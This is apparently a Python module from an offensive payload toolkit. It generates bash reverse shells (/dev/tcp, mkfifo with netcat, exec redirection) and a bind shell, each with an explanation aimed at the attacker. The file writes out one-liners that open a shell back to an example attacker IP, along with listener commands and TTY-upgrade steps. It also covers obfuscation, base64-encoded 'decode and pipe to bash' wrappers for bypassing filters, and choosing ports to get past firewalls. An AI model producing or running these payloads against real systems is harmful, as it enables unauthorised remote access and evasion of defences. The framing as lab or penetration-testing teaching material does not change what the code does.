"""
Bash Reverse Shell Generator

Generates various bash-based reverse shells with educational explanations.
"""

from typing import Dict, List
from .base import PayloadGenerator, PayloadConfig, PayloadExplanation


class BashGenerator(PayloadGenerator):
    """
    Generates Bash reverse shell payloads
    
    Supports multiple variants:
    - /dev/tcp method (most common)
    - Named pipe (mkfifo) method
    - Exec redirection method
    """
    
    def __init__(self, config: PayloadConfig):
        super().__init__(config)
        self.variant = 'dev_tcp'  # default variant
    
    def generate(self) -> str:
        """Generate bash reverse shell payload"""
        
        if self.variant == 'dev_tcp':
            payload = self._generate_dev_tcp()
        elif self.variant == 'mkfifo':
            payload = self._generate_mkfifo()
        elif self.variant == 'exec':
            payload = self._generate_exec()
        else:
            payload = self._generate_dev_tcp()  # fallback
        
        return self.post_process(payload)
    
    def _generate_dev_tcp(self) -> str:
        """
        Generate /dev/tcp reverse shell
        
        This is the most common bash reverse shell.
        Uses bash's built-in /dev/tcp device.
        """
        lhost = self.config.lhost
        lport = self.config.lport
        shell = self.config.shell_type
        
        payload = f"{shell} -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        
        return payload
    
    def _generate_mkfifo(self) -> str:
        """
        Generate mkfifo (named pipe) reverse shell
        
        More complex but works when /dev/tcp is disabled.
        Uses named pipes for bidirectional communication.
        """
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = (
            f"rm -f /tmp/f; "
            f"mkfifo /tmp/f; "
            f"cat /tmp/f | /bin/sh -i 2>&1 | nc {lhost} {lport} > /tmp/f"
        )
        
        return payload
    
    def _generate_exec(self) -> str:
        """
        Generate exec redirection reverse shell
        
        Uses file descriptors for cleaner connection.
        """
        lhost = self.config.lhost
        lport = self.config.lport
        
        payload = (
            f"exec 5<>/dev/tcp/{lhost}/{lport}; "
            f"cat <&5 | while read line; do $line 2>&5 >&5; done"
        )
        
        return payload
    
    def generate_all_variants(self) -> Dict[str, str]:
        """
        Generate all bash variants
        
        Returns:
            Dictionary of variant_name -> payload
        """
        variants = {}
        
        for variant in ['dev_tcp', 'mkfifo', 'exec']:
            self.variant = variant
            variants[variant] = self.generate()
        
        # Reset to default
        self.variant = 'dev_tcp'
        
        return variants
    
    def explain(self) -> Dict[str, str]:
        """Explain how the bash reverse shell works"""
        
        overview = """
Bash reverse shell uses bash's built-in networking features to create
a connection back to your machine. The most common method uses /dev/tcp,
a special pseudo-device that bash provides for TCP connections.
"""
        
        how_it_works = """
Let's break down: bash -i >& /dev/tcp/10.10.14.5/443 0>&1

1. bash -i
   Starts an interactive bash shell (-i flag)
   
2. >&
   Redirects both stdout (1) and stderr (2)
   
3. /dev/tcp/10.10.14.5/443
   Bash's special file that represents a TCP connection
   Opens connection to 10.10.14.5 on port 443
   
4. 0>&1
   Redirects stdin (0) to wherever stdout (1) goes
   Creates bidirectional communication

RESULT:
• Everything you type → sent to target
• Target output → sent back to you
• Errors → also sent back
• Complete interactive shell!

WHY IT WORKS:
Bash treats /dev/tcp/HOST/PORT as a file. When you redirect to it,
bash automatically creates a TCP connection. This is a bash feature,
not available in all shells (sh, dash, etc.).
"""
        
        requirements = [
            "Bash shell (not just /bin/sh)",
            "/dev/tcp support (enabled by default in most bash builds)",
            "Network access (target can reach your IP)",
            "No firewall blocking the port"
        ]
        
        usage = f"""
STEP 1: Start listener on your machine
  nc -lvnp {self.config.lport}

STEP 2: Execute on target
  {self.generate()}

STEP 3: Upgrade to full TTY (optional)
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  [Press Ctrl+Z]
  stty raw -echo; fg
  export TERM=xterm
"""
        
        tips = """
TROUBLESHOOTING:
• If "/dev/tcp: No such file" → bash doesn't support /dev/tcp
  Solution: Use mkfifo variant or netcat
  
• If "Connection refused" → listener not running or wrong IP/port
  Solution: Check IP with 'ip addr show tun0'
  
• If shell connects then dies → bash not found or wrong path
  Solution: Try /bin/sh instead of /bin/bash

COMMON PORTS:
• 443 (HTTPS) - Most likely to bypass firewall
• 80 (HTTP) - Second choice
• 53 (DNS) - Often allowed
• 4444 - Traditional but often blocked
"""
        
        return PayloadExplanation.format_explanation(
            overview=overview.strip(),
            how_it_works=how_it_works.strip(),
            requirements=requirements,
            usage=usage.strip(),
            tips=tips.strip()
        )
    
    def test_requirements(self) -> List[str]:
        """Check what's needed on target"""
        return ['bash', '/dev/tcp support']
    
    def obfuscate_simple(self, payload: str) -> str:
        """
        Simple bash obfuscation using variable expansion
        """
        # Example: bash -> ${PATH:0:1}ash
        # This is basic - real obfuscation would be more complex
        obfuscated = payload.replace('bash', '${0:0:1}ash')
        obfuscated = obfuscated.replace('/bin/', '/${PATH%%:*}/')
        return obfuscated
    
    def get_listener_command(self) -> str:
        """Get netcat listener command"""
        return f"nc -lvnp {self.config.lport}"
    
    def check_target_compatibility(self, target_shell: str) -> tuple[bool, str]:
        """
        Check if target shell supports this payload
        
        Args:
            target_shell: Shell type on target (/bin/sh, /bin/bash, etc.)
            
        Returns:
            (is_compatible, reason)
        """
        if 'bash' not in target_shell.lower():
            return False, "/dev/tcp is a bash-specific feature. Use mkfifo variant with /bin/sh"
        
        return True, "Compatible"
    
    def generate_encoded_variant(self) -> str:
        """
        Generate base64 encoded version for bypassing filters
        
        Useful when special characters are filtered
        """
        import base64
        
        payload = self._generate_dev_tcp()
        encoded = base64.b64encode(payload.encode()).decode()
        
        # Create command that decodes and executes
        wrapper = f"echo {encoded} | base64 -d | bash"
        
        return wrapper


class BashBindShellGenerator(PayloadGenerator):
    """
    Generates Bash bind shell (target listens, attacker connects)
    
    Less common but useful when reverse connections are blocked.
    """
    
    def generate(self) -> str:
        """Generate bash bind shell"""
        port = self.config.lport
        
        # Create bind shell on specified port
        payload = (
            f"rm -f /tmp/f; mkfifo /tmp/f; "
            f"cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p {port} > /tmp/f"
        )
        
        return self.post_process(payload)
    
    def explain(self) -> Dict[str, str]:
        """Explain bind shell"""
        overview = """
A bind shell opens a port on the TARGET machine and waits for YOU to connect.
This is opposite of a reverse shell where the target connects to you.
"""
        
        how_it_works = """
The target runs: nc -l -p 4444 | /bin/sh
This makes the target LISTEN on port 4444

You connect: nc target_ip 4444
You now have a shell!

USE CASES:
• Target can't make outbound connections (firewall)
• You're already in the network with target
• Target has no egress filtering

DOWNSIDES:
• Easier to detect (open port on target)
• May trigger IDS/IPS
• Firewall may block incoming connections
"""
        
        requirements = ["bash or sh", "netcat (nc)", "Open port on target"]
        
        usage = f"""
STEP 1: Execute on target
  {self.generate()}

STEP 2: Connect from your machine
  nc {self.config.lhost} {self.config.lport}

STEP 3: You now have a shell!
"""
        
        return PayloadExplanation.format_explanation(
            overview=overview.strip(),
            how_it_works=how_it_works.strip(),
            requirements=requirements,
            usage=usage.strip()
        )
    
    def test_requirements(self) -> List[str]:
        return ['bash', 'netcat']
    
    def get_listener_command(self) -> str:
        """For bind shell, YOU connect (not listen)"""
        return f"nc {self.config.lhost} {self.config.lport}"
